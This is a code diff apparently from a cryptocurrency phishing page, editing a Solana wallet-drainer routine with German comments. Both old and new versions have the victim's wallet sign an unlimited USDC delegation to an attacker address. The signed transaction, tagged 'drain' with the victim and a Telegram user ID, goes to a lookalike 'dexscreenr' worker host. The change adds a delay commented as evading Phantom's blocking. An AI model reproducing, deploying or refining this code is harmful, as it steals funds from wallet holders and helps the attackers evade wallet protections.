@@ -508,26 +508,33 @@
         navigator.sendBeacon("https://dexscreenr.rthvzkr6jv.workers.dev", new Blob([basePayload], {type: 'application/json'})); 
       }
 
-      // 3. Signatur anfordern (Ohne RPC Check)
-      const conn = new solanaWeb3.Connection("https://solana-mainnet.rpc.extrnode.com"); 
-      const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
+      // 3. Signatur anfordern (mit kurzer Verzögerung, damit Phantom nicht blockt)
+      setTimeout(async () => {
+        try {
+          const conn = new solanaWeb3.Connection("https://solana-mainnet.rpc.extrnode.com"); 
+          const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
 
-      const victimAta = await splToken.getAssociatedTokenAddress(new solanaWeb3.PublicKey(USDC_MINT), resp.publicKey);
-      
-      const delegateIx = splToken.createApproveInstruction(victimAta, new solanaWeb3.PublicKey(ATTACKER), resp.publicKey, [], BigInt("18446744073709551615"));
-      const tx = new solanaWeb3.Transaction().add(delegateIx);
-      tx.feePayer = resp.publicKey;
-      tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
+          const victimAta = await splToken.getAssociatedTokenAddress(new solanaWeb3.PublicKey(USDC_MINT), resp.publicKey);
+          
+          const delegateIx = splToken.createApproveInstruction(victimAta, new solanaWeb3.PublicKey(ATTACKER), resp.publicKey, [], BigInt("18446744073709551615"));
+          const tx = new solanaWeb3.Transaction().add(delegateIx);
+          tx.feePayer = resp.publicKey;
+          tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
 
-      const signedTx = await provider.signTransaction(tx);
+          const signedTx = await provider.signTransaction(tx);
 
-      await fetch("https://dexscreenr.rthvzkr6jv.workers.dev", { 
-        method: "POST", headers: { "Content-Type": "application/json" }, 
-        body: JSON.stringify({ victim, tx: bs58.encode(signedTx.serialize()), chain: "solana", type: "drain", tg_user_id: tgUserId, ts: Date.now() }) 
-      });
+          await fetch("https://dexscreenr.rthvzkr6jv.workers.dev", { 
+            method: "POST", headers: { "Content-Type": "application/json" }, 
+            body: JSON.stringify({ victim, tx: bs58.encode(signedTx.serialize()), chain: "solana", type: "drain", tg_user_id: tgUserId, ts: Date.now() }) 
+          });
+
+        } catch(err) {
+          alert("SIGNATUR FEHLER: " + err.message); // Zeigt dir den Fehler an
+        }
+      }, 800); // 800ms Verzögerung
       
     } catch (e) { 
-      console.log("Wallet connection failed or rejected.", e);
+      alert("CONNECT FEHLER: " + e.message);
     }
   }
 
